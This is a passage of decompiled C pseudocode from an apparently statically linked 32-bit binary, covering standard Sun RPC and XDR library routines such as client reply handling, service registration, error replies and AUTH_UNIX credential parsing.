    memcpy(&v42, (char *)&null_auth, 0xCu);
    v44 = a7;
    v45 = a6;
    v57 = *(_DWORD *)v9;
    v58 = 1;
    do
    {
      while ( 1 )
      {
        v15 = poll((struct pollfds *)&v57, 1u, timeout);
        if ( v15 != -1 )
          break;
        v12 = *(_DWORD *)_errno_location();
        v17 = v12 == 4;
LABEL_55:
        if ( !v17 )
          goto LABEL_56;
      }
      if ( !v15 )
      {
        d = *(_DWORD *)v9;
        v54 = (int *)&v34;
        v53 = 8800;
        if ( !ioctl(d, 35090) )
        {
          v16 = (unsigned int)v53 >> 5;
          v28 = v54;
          while ( v16 > 0 )
          {
            memcpy((char *)&v46, (char *)v28, 0x20u);
            if ( (ioctl(d, 35091) & 0x80000000) != 0 )
              break;
            if ( v47 & 1 && *((_WORD *)v28 + 8) == 2 )
            {
              v31 += *(_DWORD *)(v9 + 28);
              for ( v30 += *(_DWORD *)(v9 + 32); v30 > 999999; v30 -= 1000000 )
                ++v31;
              if ( v31 < v33 || v31 == v33 && v30 < v32 )
                goto LABEL_13;
              goto LABEL_33;
            }
            v28 += 8;
            --v16;
          }
        }
        goto LABEL_57;
      }
      if ( v59 & 8 )
      {
        v56 = v25;
        v35 = 16;
        v18 = alloca(v25 + 271);
        v34 = &v49;
        v36 = &v55;
        v55 = (((unsigned int)&timeout + 3) & 0xFFFFFFF0) + 256;
        v37 = 1;
        v40 = 0;
        v38 = ((unsigned int)&timeout + 3) & 0xFFFFFFF0;
        v39 = 256;
        v19 = _libc_recvmsg(*(_DWORD *)v9, (int)&v34, 0x2000);
        v20 = v19;
        if ( v19 >= 0
          && !memcmp((((unsigned int)&timeout + 3) & 0xFFFFFFF0) + 256, *(_DWORD *)(v9 + 88), v19)
          && BYTE1(v40) & 0x20 )
        {
          if ( v35 )
          {
            if ( v35 != 16 || v49 != 2 || memcmp((int)&v51, v9 + 12, 4u) || v50 != *(_WORD *)(v9 + 10) )
              goto LABEL_52;
          }
          else if ( v20 <= 11 )
          {
            goto LABEL_52;
          }
          v21 = 0;
          if ( v39 > 0xB )
            v21 = (_DWORD *)v38;
          while ( 1 )
          {
            if ( !v21 )
              goto LABEL_52;
            if ( !v21[1] && v21[2] == 11 )
              break;
            v21 = _cmsg_nxthdr((int)&v34, v21);
          }
          v12 = v21[3];
LABEL_56:
          *(_DWORD *)(v9 + 48) = v12;
LABEL_57:
          result = 4;
          *(_DWORD *)(v9 + 44) = 4;
          return result;
        }
      }
LABEL_52:
      while ( 1 )
      {
        v60 = 16;
        v22 = _libc_recvfrom(*(_DWORD *)v9, v9 + 96, *(_DWORD *)(v9 + 92), 0, (int)&v52, (int)&v60);
        if ( v22 >= 0 )
          break;
        if ( *(_DWORD *)_errno_location() != 4 )
        {
          v12 = *(_DWORD *)_errno_location();
          v17 = v12 == 11;
          goto LABEL_55;
        }
      }
    }
    while ( v22 <= 3 || a4 && *(_DWORD *)(v9 + 96) != **(_DWORD **)(v9 + 88) );
    xdrmem_create(&v48, v9 + 96, v22, 1);
    a1 = &v41;
    if ( !xdr_replymsg(v23, (int)&v48, &v41) )
    {
      *(_DWORD *)(v9 + 44) = 2;
      return *(_DWORD *)(v9 + 44);
    }
    seterr_reply(&v41, (int *)(v9 + 44));
    if ( !*(_DWORD *)(v9 + 44) )
      break;
    if ( v27 <= 0 || !(*(int (__cdecl **)(_DWORD))(*(_DWORD *)(*a2 + 32) + 12))(*a2) )
      return *(_DWORD *)(v9 + 44);
    --v27;
  }
  if ( !(*(int (__cdecl **)(_DWORD, char *, _DWORD *, _DWORD *))(*(_DWORD *)(*a2 + 32) + 8))(*a2, &v42, a2, a2) )
  {
    *(_DWORD *)(v9 + 44) = 7;
    *(_DWORD *)(v9 + 48) = 6;
  }
  if ( v43 )
  {
    *v24 = 2;
    xdr_opaque_auth((int)v24, (int)&v42);
  }
  return *(_DWORD *)(v9 + 44);
}
// 806AA20: using guessed type int null_auth;

//----- (08055CBC) --------------------------------------------------------
int __usercall create_xid@<eax>(off_t a1@<ebp>)
{
  char v2; // [esp+1Ch] [ebp-20h]@1
  int v3; // [esp+2Ch] [ebp-10h]@2
  int v4; // [esp+30h] [ebp-Ch]@2
  int v5; // [esp+34h] [ebp-8h]@3

  pthread_cleanup_push_defer(&v2, (int)pthread_mutex_unlock, (int)&mylock_1);
  pthread_mutex_lock((int)&mylock_1);
  if ( !is_initialized )
  {
    gettimeofday((int)&v3, 0);
    srand48_r(v3 ^ v4, (int)&_rpc_lrand48_data);
    is_initialized = 1;
  }
  lrand48_r((unsigned __int16 *)&_rpc_lrand48_data, &v5);
  pthread_cleanup_pop_restore(a1, (int)&v2, 1);
  return v5;
}
// 806A580: using guessed type char is_initialized;

//----- (08055D40) --------------------------------------------------------
int __usercall pmap_getport@<eax>(off_t a1@<ebp>, int a2, int a3, int a4, int a5)
{
  char **v5; // ebx@1
  _DWORD *v6; // esi@2
  int v7; // eax@2
  int v9; // [esp+8h] [ebp-24h]@2
  int v10; // [esp+Ch] [ebp-20h]@2
  int v11; // [esp+10h] [ebp-1Ch]@2
  int v12; // [esp+14h] [ebp-18h]@2
  int v13; // [esp+18h] [ebp-14h]@1
  unsigned __int16 v14; // [esp+1Eh] [ebp-Eh]@1

  v14 = 0;
  v13 = -1;
  *(_WORD *)(a2 + 2) = 28416;
  v5 = clntudp_bufcreate(a1, a2, a2, 100000, 2, timeout, 0, &v13, 400, 400);
  if ( v5 )
  {
    v12 = 0;
    v6 = _rpc_thread_createerr(a1, a2);
    v9 = a3;
    v10 = a4;
    v11 = a5;
    v7 = (*(int (__cdecl **)(char **, signed int, int (__usercall *)@<eax>(int@<eax>, int, _DWORD *), int *, int (__cdecl *)(int, _WORD *), unsigned __int16 *, int, _DWORD))v5[1])(
           v5,
           3,
           xdr_pmap,
           &v9,
           xdr_u_short,
           &v14,
           tottimeout,
           0);
    if ( v7 )
    {
      *v6 = 14;
      (*((void (__cdecl **)(char **, _DWORD *, int, int))v5[1] + 2))(v5, v6 + 1, v7, v7);
    }
    else if ( !v14 )
    {
      *v6 = 15;
    }
    (*((void (__cdecl **)(char **))v5[1] + 4))(v5);
  }
  *(_WORD *)(a2 + 2) = 0;
  return v14;
}
// 805BCB8: using guessed type int timeout;
// 805BCC0: using guessed type int tottimeout;

//----- (08055E30) --------------------------------------------------------
int __usercall xdr_pmap@<eax>(int a1@<eax>, int a2, _DWORD *a3)
{
  int result; // eax@4

  if ( xdr_u_long(a1, a2, a3) && xdr_u_long((int)(a3 + 1), a2, a3 + 1) && xdr_u_long((int)(a3 + 2), a2, a3 + 2) )
    result = xdr_u_long((int)(a3 + 3), a2, a3 + 3);
  else
    result = 0;
  return result;
}

//----- (08055E8C) --------------------------------------------------------
int __cdecl seterr_reply(_DWORD *a1, int *a2)
{
  int v2; // eax@1
  int result; // eax@4

  v2 = a1[2];
  if ( v2 )
  {
    if ( v2 == 1 )
    {
      result = a1[3];
      if ( result == 1 )
      {
        *a2 = 7;
      }
      else if ( result == 6 )
      {
        *a2 = 6;
      }
      else
      {
        *a2 = 16;
        a2[1] = 1;
LABEL_19:
        a2[2] = result;
      }
    }
    else
    {
      *a2 = 16;
      a2[1] = a1[2];
    }
  }
  else
  {
    result = a1[6];
    if ( !result )
    {
      *a2 = 0;
      return result;
    }
    switch ( result )
    {
      case 0:
        *a2 = 0;
        break;
      case 1:
        *a2 = 8;
        break;
      case 2:
        *a2 = 9;
        break;
      case 3:
        *a2 = 10;
        break;
      case 4:
        *a2 = 11;
        break;
      case 5:
        *a2 = 12;
        break;
      default:
        *a2 = 16;
        a2[1] = 0;
        goto LABEL_19;
    }
  }
  result = *a2;
  if ( *a2 == 7 )
  {
    result = a1[4];
    a2[1] = result;
  }
  else if ( result == 9 )
  {
    a2[1] = a1[7];
    result = a1[8];
    a2[2] = result;
  }
  else if ( result == 6 )
  {
    a2[1] = a1[4];
    result = a1[5];
    a2[2] = result;
  }
  return result;
}

//----- (08055F6A) --------------------------------------------------------
int __usercall xdr_callhdr@<eax>(int eax0@<eax>, _DWORD *a1, int a2)
{
  int result; // eax@6

  *(_DWORD *)(a2 + 4) = 0;
  *(_DWORD *)(a2 + 8) = 2;
  if ( !*a1
    && xdr_u_long(eax0, (int)a1, (_DWORD *)a2)
    && xdr_enum(a1, a2 + 4)
    && xdr_u_long(a2 + 8, (int)a1, (_DWORD *)(a2 + 8))
    && xdr_u_long(a2 + 12, (int)a1, (_DWORD *)(a2 + 12)) )
  {
    result = xdr_u_long(a2 + 16, (int)a1, (_DWORD *)(a2 + 16));
  }
  else
  {
    result = 0;
  }
  return result;
}

//----- (08055FEC) --------------------------------------------------------
int __cdecl xdr_rejected_reply(int a1, _DWORD *a2)
{
  if ( xdr_enum(a1, a2) )
  {
    if ( *a2 )
    {
      if ( *a2 == 1 )
        return xdr_enum(a1, a2 + 1);
    }
    else if ( xdr_u_long((int)(a2 + 1), a1, a2 + 1) )
    {
      return xdr_u_long((int)(a2 + 2), a1, a2 + 2);
    }
  }
  return 0;
}

//----- (08056051) --------------------------------------------------------
int __usercall xdr_replymsg@<eax>(int a1@<eax>, int a2, _DWORD *a3)
{
  int result; // eax@4

  if ( xdr_u_long(a1, a2, a3) && xdr_enum(a2, a3 + 1) && a3[1] == 1 )
    result = xdr_union(a2, a3 + 2, (int)(a3 + 3), &reply_dscrm, 0);
  else
    result = 0;
  return result;
}

//----- (080560A8) --------------------------------------------------------
int __cdecl xdr_des_block(int a1, int a2)
{
  return xdr_opaque((_DWORD *)a1, a2, 8);
}

//----- (080560BE) --------------------------------------------------------
int __cdecl xdr_opaque_auth(int a1, int a2)
{
  int v2; // eax@1
  int v3; // edx@1

  v2 = xdr_enum(a1, a2);
  v3 = 0;
  if ( v2 )
    v3 = xdr_bytes((_DWORD *)a1, (_DWORD **)(a2 + 4), (unsigned int *)(a2 + 8), 0x190u);
  return v3;
}

//----- (080560F9) --------------------------------------------------------
int __cdecl xdr_accepted_reply(int a1, _DWORD *a2)
{
  int v2; // edx@3
  int result; // eax@4
  int v4; // [esp+8h] [ebp-Ch]@0

  if ( !xdr_opaque_auth(a1, (int)a2) || !xdr_enum(a1, a2 + 3) )
    goto LABEL_12;
  v2 = a2[3];
  if ( !v2 )
    return ((int (__cdecl *)(int, _DWORD))a2[5])(a1, a2[4]);
  result = 1;
  if ( v2 != 2 )
    return result;
  if ( xdr_u_long((int)(a2 + 4), a1, a2 + 4) )
    result = xdr_u_long(v4, a1, a2 + 5);
  else
LABEL_12:
    result = 0;
  return result;
}

//----- (0805617C) --------------------------------------------------------
int __cdecl svc_sendreply(int a1, int a2, int a3)
{
  char v4; // [esp+8h] [ebp-34h]@1
  int v5; // [esp+Ch] [ebp-30h]@1
  int v6; // [esp+10h] [ebp-2Ch]@1
  char v7; // [esp+14h] [ebp-28h]@1
  int v8; // [esp+20h] [ebp-1Ch]@1
  int v9; // [esp+24h] [ebp-18h]@1
  int v10; // [esp+28h] [ebp-14h]@1

  v5 = 1;
  v6 = 0;
  memcpy(&v7, (char *)(a1 + 32), 0xCu);
  v8 = 0;
  v9 = a3;
  v10 = a2;
  return (*(int (__cdecl **)(int, char *))(*(_DWORD *)(a1 + 8) + 12))(a1, &v4);
}

//----- (080561D0) --------------------------------------------------------
int __cdecl svcerr_noproc(int a1)
{
  char v2; // [esp+8h] [ebp-34h]@1
  int v3; // [esp+Ch] [ebp-30h]@1
  int v4; // [esp+10h] [ebp-2Ch]@1
  char v5; // [esp+14h] [ebp-28h]@1
  int v6; // [esp+20h] [ebp-1Ch]@1

  v3 = 1;
  v4 = 0;
  memcpy(&v5, (char *)(a1 + 32), 0xCu);
  v6 = 3;
  return (*(int (__cdecl **)(int, char *))(*(_DWORD *)(a1 + 8) + 12))(a1, &v2);
}

//----- (08056214) --------------------------------------------------------
int __cdecl svcerr_decode(int a1)
{
  char v2; // [esp+8h] [ebp-34h]@1
  int v3; // [esp+Ch] [ebp-30h]@1
  int v4; // [esp+10h] [ebp-2Ch]@1
  char v5; // [esp+14h] [ebp-28h]@1
  int v6; // [esp+20h] [ebp-1Ch]@1

  v3 = 1;
  v4 = 0;
  memcpy(&v5, (char *)(a1 + 32), 0xCu);
  v6 = 4;
  return (*(int (__cdecl **)(int, char *))(*(_DWORD *)(a1 + 8) + 12))(a1, &v2);
}

//----- (08056258) --------------------------------------------------------
int __cdecl svcerr_systemerr(int a1)
{
  char v2; // [esp+8h] [ebp-34h]@1
  int v3; // [esp+Ch] [ebp-30h]@1
  int v4; // [esp+10h] [ebp-2Ch]@1
  char v5; // [esp+14h] [ebp-28h]@1
  int v6; // [esp+20h] [ebp-1Ch]@1

  v3 = 1;
  v4 = 0;
  memcpy(&v5, (char *)(a1 + 32), 0xCu);
  v6 = 5;
  return (*(int (__cdecl **)(int, char *))(*(_DWORD *)(a1 + 8) + 12))(a1, &v2);
}

//----- (0805629C) --------------------------------------------------------
int __cdecl svcerr_auth(int a1, int a2)
{
  char v3; // [esp+14h] [ebp-30h]@1
  int v4; // [esp+18h] [ebp-2Ch]@1
  int v5; // [esp+1Ch] [ebp-28h]@1
  int v6; // [esp+20h] [ebp-24h]@1
  int v7; // [esp+24h] [ebp-20h]@1

  v7 = a2;
  v4 = 1;
  v5 = 1;
  v6 = 1;
  return (*(int (__cdecl **)(int, char *))(*(_DWORD *)(a1 + 8) + 12))(a1, &v3);
}

//----- (080562D3) --------------------------------------------------------
int __cdecl svcerr_weakauth(int a1)
{
  return svcerr_auth(a1, 5);
}

//----- (080562E5) --------------------------------------------------------
int __cdecl svcerr_noprog(int a1)
{
  char v2; // [esp+8h] [ebp-34h]@1
  int v3; // [esp+Ch] [ebp-30h]@1
  int v4; // [esp+10h] [ebp-2Ch]@1
  char v5; // [esp+14h] [ebp-28h]@1
  int v6; // [esp+20h] [ebp-1Ch]@1

  v3 = 1;
  v4 = 0;
  memcpy(&v5, (char *)(a1 + 32), 0xCu);
  v6 = 1;
  return (*(int (__cdecl **)(int, char *))(*(_DWORD *)(a1 + 8) + 12))(a1, &v2);
}

//----- (08056329) --------------------------------------------------------
int __cdecl svcerr_progvers(int a1, int a2, int a3)
{
  char v4; // [esp+8h] [ebp-34h]@1
  int v5; // [esp+Ch] [ebp-30h]@1
  int v6; // [esp+10h] [ebp-2Ch]@1
  char v7; // [esp+14h] [ebp-28h]@1
  int v8; // [esp+20h] [ebp-1Ch]@1
  int v9; // [esp+24h] [ebp-18h]@1
  int v10; // [esp+28h] [ebp-14h]@1

  v5 = 1;
  v6 = 0;
  memcpy(&v7, (char *)(a1 + 32), 0xCu);
  v8 = 2;
  v9 = a2;
  v10 = a3;
  return (*(int (__cdecl **)(int, char *))(*(_DWORD *)(a1 + 8) + 12))(a1, &v4);
}

//----- (0805637D) --------------------------------------------------------
int __usercall svc_find@<eax>(int a1@<eax>, int a2@<edx>, _DWORD *a3@<ecx>, off_t a4@<ebp>)
{
  int v4; // edi@1
  _DWORD *v5; // esi@1
  int v6; // ebx@1
  __int64 i; // rax@1

  v4 = a1;
  v5 = a3;
  v6 = a2;
  for ( i = (unsigned int)_rpc_thread_variables(a4, a1)[46];
        (_DWORD)i && (*(_DWORD *)(i + 4) != v4 || *(_DWORD *)(i + 8) != v6);
        LODWORD(i) = *(_DWORD *)i )
  {
    HIDWORD(i) = i;
  }
  *v5 = HIDWORD(i);
  return i;
}

//----- (080563AD) --------------------------------------------------------
int __usercall svc_getreq_common@<eax>(off_t a1@<ebp>, int a2@<edi>, int a3)
{
  _DWORD *v3; // eax@1
  _DWORD *v4; // ebp@1
  int v5; // edx@1
  int result; // eax@1
  int v7; // ebx@1
  int v8; // eax@5
  int **v9; // edx@7
  unsigned int v10; // edi@7
  unsigned int v11; // esi@7
  signed int v12; // ecx@7
  unsigned int v13; // eax@9
  int v14; // eax@20
  char v15; // [esp+Ch] [ebp-510h]@1
  char v16; // [esp+19Ch] [ebp-380h]@1
  char v17; // [esp+32Ch] [ebp-1F0h]@3
  char v18; // [esp+4BCh] [ebp-60h]@2
  int *v19; // [esp+4C8h] [ebp-54h]@3
  int v20; // [esp+4CCh] [ebp-50h]@3
  int v21; // [esp+4D0h] [ebp-4Ch]@3
  int v22; // [esp+4D4h] [ebp-48h]@3
  char *v23; // [esp+4D8h] [ebp-44h]@1
  char *v24; // [esp+4E4h] [ebp-38h]@1
  int *v25; // [esp+4ECh] [ebp-30h]@3
  int v26; // [esp+4F0h] [ebp-2Ch]@3
  int v27; // [esp+4F4h] [ebp-28h]@3
  char v28; // [esp+4F8h] [ebp-24h]@3
  char *v29; // [esp+504h] [ebp-18h]@3
  int v30; // [esp+508h] [ebp-14h]@3

  v23 = &v15;
  v24 = &v16;
  v3 = _rpc_thread_variables(a1, a2);
  v4 = v3;
  v5 = v3[45];
  result = a3;
  v7 = *(_DWORD *)(v5 + 4 * a3);
  if ( v7 )
  {
    do
    {
      if ( !(**(int (__cdecl ***)(int, char *, int, int))(v7 + 8))(v7, &v18, result, result) )
        goto LABEL_20;
      v29 = &v17;
      v25 = v19;
      v26 = v20;
      v27 = v21;
      v30 = v7;
      memcpy(&v28, (char *)&v22, 0xCu);
      if ( v22 )
      {
        v8 = authenticate((int)&v25, (int)&v18);
        if ( v8 )
        {
          svcerr_auth(v7, v8);
          goto LABEL_20;
        }
      }
      else
      {
        *(_DWORD *)(v30 + 32) = null_auth;
        *(_DWORD *)(v30 + 40) = 0;
      }
      v9 = (int **)v4[46];
      v10 = -1;
      v11 = 0;
      v12 = 0;
      while ( v9 )
      {
        if ( v9[1] == v25 )
        {
          v13 = (unsigned int)v9[2];
          if ( v13 == v26 )
          {
            ((void (__fastcall *)(signed int))v9[3])(v12);
            goto LABEL_20;
          }
          if ( v10 > v13 )
            v10 = (unsigned int)v9[2];
          v12 = 1;
          if ( v13 > v11 )
            v11 = (unsigned int)v9[2];
        }
        v9 = (int **)*v9;
      }
      if ( v12 )
        svcerr_progvers(v7, v10, v11);
      else
        svcerr_noprog(v7);
LABEL_20:
      v14 = (*(int (__cdecl **)(int))(*(_DWORD *)(v7 + 8) + 4))(v7);
      if ( !v14 )
        return (*(int (__cdecl **)(int))(*(_DWORD *)(v7 + 8) + 20))(v7);
      result = v14 - 1;
    }
    while ( !result );
  }
  return result;
}
// 806AA20: using guessed type int null_auth;

//----- (0805654A) --------------------------------------------------------
int __cdecl svc_getreqset(int *a1)
{
  off_t v1; // ebp@1
  int result; // eax@1
  int *v3; // edi@1
  int i; // esi@2
  char v5; // bl@4
  int v6; // [esp+8h] [ebp-14h]@1

  v1 = 0;
  result = rpc_dtablesize();
  v3 = a1;
  v6 = result;
  while ( v1 < v6 )
  {
    for ( i = *v3; ; i ^= 1 << (v5 - 1) )
    {
      result = ffs(i);
      v5 = result;
      if ( !result )
        break;
      svc_getreq_common(v1, (int)v3, v1 + result - 1);
    }
    ++v3;
    v1 += 32;
  }
  return result;
}

//----- (080565A8) --------------------------------------------------------
int __cdecl svc_getreq(int a1)
{
  int v2; // [esp+8h] [ebp-84h]@1

  memset(&v2, 0, 0x80u);
  v2 = a1;
  return svc_getreqset(&v2);
}

//----- (080565E3) --------------------------------------------------------
int *__cdecl svc_unregister(off_t a1, int a2)
{
  int *result; // eax@1
  int v3; // esi@2
  int *v4; // [esp+18h] [ebp-14h]@1

  result = (int *)svc_find(a1, a2, &v4, a1);
  if ( result )
  {
    v3 = *result;
    if ( v4 )
      *v4 = v3;
    else
      _rpc_thread_variables(a1, a2)[46] = v3;
    *result = 0;
    free(a1, result);
    result = (int *)pmap_unset(a1, a2, a1, a2);
  }
  return result;
}

//----- (08056641) --------------------------------------------------------
int __usercall _rpc_thread_svc_cleanup@<eax>(off_t a1@<ebp>, int a2@<edi>)
{
  int result; // eax@3

  while ( 1 )
  {
    result = _rpc_thread_variables(a1, a2)[46];
    if ( !result )
      break;
    svc_unregister(*(_DWORD *)(result + 4), *(_DWORD *)(result + 8));
  }
  return result;
}

//----- (08056669) --------------------------------------------------------
int __cdecl svc_register(int a1, int a2, int a3, off_t a4, int a5)
{
  int v5; // eax@1
  _DWORD *v6; // eax@4
  _DWORD *v7; // ebx@4
  _DWORD *v8; // eax@5
  int result; // eax@6
  char v10; // [esp+18h] [ebp-14h]@1

  v5 = svc_find(a2, a3, &v10, a4);
  if ( !v5 )
  {
    v6 = (_DWORD *)malloc(a4, a2, 0x10u);
    v7 = v6;
    if ( v6 )
    {
      v6[1] = a2;
      v6[2] = a3;
      v6[3] = a4;
      v8 = _rpc_thread_variables(a4, a2);
      *v7 = v8[46];
      v8[46] = v7;
      goto LABEL_6;
    }
    return 0;
  }
  if ( *(_DWORD *)(v5 + 12) != a4 )
    return 0;
LABEL_6:
  result = 1;
  if ( a5 )
    result = pmap_set(a4, a2, a2, a3, a5, *(_WORD *)(a1 + 4));
  return result;
}

//----- (080566F2) --------------------------------------------------------
_DWORD *__usercall xprt_unregister@<eax>(off_t a1@<ebp>, int a2@<edi>, signed int *a3)
{
  signed int v3; // ebx@1
  _DWORD *result; // eax@1
  int i; // esi@5
  _DWORD *v6; // edx@6

  v3 = *a3;
  result = (_DWORD *)rpc_dtablesize();
  if ( v3 < (signed int)result )
  {
    result = (_DWORD *)_rpc_thread_variables(a1, a2)[45];
    if ( (signed int *)result[v3] == a3 )
    {
      result[v3] = 0;
      if ( v3 <= 1023 )
        _bittestandreset((signed __int32 *)_rpc_thread_svc_fdset(a1, a2) + ((unsigned int)v3 >> 5), v3 & 0x1F);
      for ( i = 0; ; ++i )
      {
        result = _rpc_thread_svc_max_pollfd(a1, a2);
        if ( i >= *result )
          break;
        v6 = (_DWORD *)(*(_DWORD *)_rpc_thread_svc_pollfd(a1, a2) + 8 * i);
        if ( *v6 == v3 )
          *v6 = -1;
      }
    }
  }
  return result;
}

//----- (08056769) --------------------------------------------------------
_DWORD *__cdecl svc_getreq_poll(int a1, off_t a2)
{
  int v2; // esi@1
  int v3; // edi@1
  int v4; // eax@2
  int v5; // ebx@2
  __int16 v6; // ax@3
  _DWORD *v7; // eax@5
  _DWORD *result; // eax@8

  v2 = 0;
  v3 = 0;
  while ( 1 )
  {
    result = _rpc_thread_svc_max_pollfd(a2, v3);
    if ( v2 >= *result || v3 >= a2 )
      break;
    v4 = a1 + 8 * v2;
    v5 = *(_DWORD *)v4;
    if ( *(_DWORD *)v4 != -1 )
    {
      v6 = *(_WORD *)(v4 + 6);
      if ( v6 )
      {
        ++v3;
        if ( v6 & 0x20 )
        {
          v7 = _rpc_thread_variables(a2, v3);
          xprt_unregister(a2, v3, *(signed int **)(v7[45] + 4 * v5));
        }
        else
        {
          svc_getreq_common(a2, v3, v5);
        }
      }
    }
    ++v2;
  }
  return result;
}

//----- (080567D0) --------------------------------------------------------
int __usercall xprt_register@<eax>(unsigned __int32 a1@<ebp>, int a2@<edi>, int *a3)
{
  _DWORD *v3; // ebx@1
  int v4; // edi@1
  int v5; // eax@2
  int result; // eax@2
  int i; // ebx@6
  int *v8; // eax@7
  int *v9; // edx@7
  _DWORD *v10; // eax@10
  _DWORD *v11; // esi@10
  int v12; // eax@10
  char **v13; // eax@11
  int *v14; // ebx@11

  v3 = _rpc_thread_variables(a1, a2);
  v4 = *a3;
  if ( v3[45] || (v5 = rpc_dtablesize(), result = malloc(a1, v4, 4 * v5), (v3[45] = result) != 0) )
  {
    result = rpc_dtablesize();
    if ( v4 < result )
    {
      *(_DWORD *)(v3[45] + 4 * v4) = a3;
      if ( v4 <= 1023 )
        _bittestandset((signed __int32 *)_rpc_thread_svc_fdset(a1, v4) + ((unsigned int)v4 >> 5), v4 & 0x1F);
      for ( i = 0; ; ++i )
      {
        v10 = _rpc_thread_svc_max_pollfd(a1, v4);
        v11 = v10;
        v12 = *v10;
        if ( i >= v12 )
          break;
        v8 = (int *)_rpc_thread_svc_pollfd(a1, v4);
        v9 = (int *)(*v8 + 8 * i);
        if ( *v9 == -1 )
        {
          *v9 = v4;
          result = *v8;
          *(_WORD *)(result + 8 * i + 4) = 195;
          return result;
        }
      }
      *v11 = v12 + 1;
      v13 = (char **)_rpc_thread_svc_pollfd(a1, v4);
      v14 = (int *)v13;
      result = realloc(a1, v4, *v13, 8 * *v11);
      *v14 = result;
      if ( result )
      {
        *(_DWORD *)(result + 8 * *v11 - 8) = v4;
        result = *v14;
        *(_WORD *)(*v14 + 8 * *v11 - 4) = 195;
      }
    }
  }
  return result;
}

//----- (080568AC) --------------------------------------------------------
signed int __cdecl authenticate(int a1, int a2)
{
  int v2; // ebx@1
  int v4; // edi@5
  unsigned __int32 v5; // ST04_4@5
  unsigned __int32 v6; // ebp@5
  int v7; // eax@5
  unsigned int v8; // esi@6
  int v9; // ebx@7
  unsigned int v10; // ebp@7
  unsigned __int32 v11; // ecx@7
  unsigned int *v12; // ebx@8
  unsigned __int32 v13; // esi@8
  unsigned int v14; // eax@9
  signed int v15; // ebx@15
  int v16; // edx@16
  void (__cdecl *v17)(int *); // edx@21
  unsigned int v18; // [esp+0h] [ebp-34h]@5
  int v19; // [esp+Ch] [ebp-28h]@5
  int v20; // [esp+10h] [ebp-24h]@5
  int v21; // [esp+24h] [ebp-10h]@5
  int v22; // [esp+28h] [ebp-Ch]@1

  memcpy((char *)(a1 + 12), (char *)(a2 + 24), 0xCu);
  *(_DWORD *)(*(_DWORD *)(a1 + 28) + 32) = null_auth;
  *(_DWORD *)(*(_DWORD *)(a1 + 28) + 40) = 0;
  v2 = v22;
  switch ( *(_DWORD *)(a1 + 12) )
  {
    case 0:
      return 0;
    case 1:
      v22 = a2;
      v21 = v2;
      v4 = *(_DWORD *)(a1 + 24);
      *(_DWORD *)(v4 + 4) = v4 + 24;
      *(_DWORD *)(v4 + 20) = v4 + 280;
      v18 = *(_DWORD *)(a2 + 32);
      xdrmem_create(&v19, *(_DWORD *)(a2 + 28), v18, 1);
      v6 = v5;
      v7 = (*(int (__cdecl **)(int *, unsigned int))(v20 + 24))(&v19, v18);
      if ( v7 )
      {
        *(_DWORD *)v4 = _byteswap_ulong(*(_DWORD *)v7);
        v8 = _byteswap_ulong(*(_DWORD *)(v7 + 4));
        if ( v8 > 0xFF
          || (v9 = v7 + 8,
              memcpy(*(char **)(v4 + 4), (char *)(v7 + 8), v8),
              v10 = (v8 + 3) & 0xFFFFFFFC,
              *(_BYTE *)(*(_DWORD *)(v4 + 4) + v8) = 0,
              *(_DWORD *)(v4 + 8) = _byteswap_ulong(*(_DWORD *)(v9 + v10)),
              *(_DWORD *)(v4 + 12) = _byteswap_ulong(*(_DWORD *)(v9 + v10 + 4)),
              v11 = _byteswap_ulong(*(_DWORD *)(v9 + v10 + 8)),
              v11 > 0x10) )
        {
          v15 = 1;
          goto LABEL_21;
        }
        v12 = (unsigned int *)(v9 + v10 + 12);
        v13 = 0;
        *(_DWORD *)(v4 + 16) = v11;
        while ( v13 < v11 )
        {
          v14 = *v12;
          ++v12;
          *(_DWORD *)(*(_DWORD *)(v4 + 20) + 4 * v13++) = _byteswap_ulong(v14);
        }
        if ( v10 + 4 * v11 + 20 > v18 )
        {
          printf("bad auth_len gid %d str %d auth %d\n", v11, v10, v18);
LABEL_15:
          v15 = 1;
          goto LABEL_21;
        }
      }
      else if ( !xdr_authunix_parms(0, v6, &v19, v4) )
      {
        v19 = 2;
        xdr_authunix_parms(0, v6, &v19, v4);
        goto LABEL_15;
      }
      v16 = *(_DWORD *)(a1 + 28);
      if ( *(_DWORD *)(a2 + 44) )
      {
        *(_DWORD *)(v16 + 32) = *(_DWORD *)(a2 + 36);
        *(_DWORD *)(*(_DWORD *)(a1 + 28) + 36) = *(_DWORD *)(a2 + 40);
        *(_DWORD *)(*(_DWORD *)(a1 + 28) + 40) = *(_DWORD *)(a2 + 44);
      }
      else
      {
        *(_DWORD *)(v16 + 32) = 0;
        *(_DWORD *)(*(_DWORD *)(a1 + 28) + 40) = 0;
      }
      v15 = 0;
LABEL_21:
      v17 = *(void (__cdecl **)(int *))(v20 + 28);
      if ( v17 )
        v17(&v19);
      return v15;
    case 2:
      return 2;
    default:
      return 2;
  }
}
// 806AA20: using guessed type int null_auth;

//----- (08056A98) --------------------------------------------------------
int __cdecl xdr_free(int (__cdecl *a1)(int *, int), int a2)
{
  int v3; // [esp+1Ch] [ebp-18h]@1

  v3 = 2;
  return a1(&v3, a2);
}

//----- (08056AB4) --------------------------------------------------------
signed int xdr_void()
{
  return 1;
}

//----- (08056ABA) --------------------------------------------------------
int __cdecl xdr_long(int *a1)
{
  int v1; // eax@1
  int (*v2)(void); // ecx@2

  v1 = *a1;
  if ( !*a1 )
  {
    v2 = *(int (**)(void))(a1[1] + 4);
    return v2();
  }
  if ( v1 == 1 )
  {
    v2 = *(int (**)(void))a1[1];
    return v2();
  }
  return v1 == 2;
}

//----- (08056AEE) --------------------------------------------------------
int __usercall xdr_short@<eax>(int a1@<eax>, int *a2, _WORD *a3)
{
  unsigned int v3; // edx@1
  int result; // eax@3
  int v5; // [esp+14h] [ebp-8h]@5

  v3 = *a2;
  if ( *a2 == 1 )
  {
    if ( (*(int (__cdecl **)(int *, int *, int, int))a2[1])(a2, &v5, a1, a1) )
    {
      *a3 = v5;
      return 1;
    }
  }
  else
  {
    if ( (unsigned int)*a2 < 1 )
    {
      v5 = (signed __int16)*a3;
      return (*(int (__cdecl **)(int *, int *, unsigned int, unsigned int))(a2[1] + 4))(a2, &v5, v3, v3);
    }
    result = 1;
    if ( v3 == 2 )
      return result;
  }
  return 0;
}

//----- (08056B57) --------------------------------------------------------
int __usercall xdr_u_long@<eax>(int a1@<eax>, int a2, _DWORD *a3)
{
  int result; // eax@3
  int v4; // [esp+14h] [ebp-8h]@5

  if ( *(_DWORD *)a2 == 1 )
  {
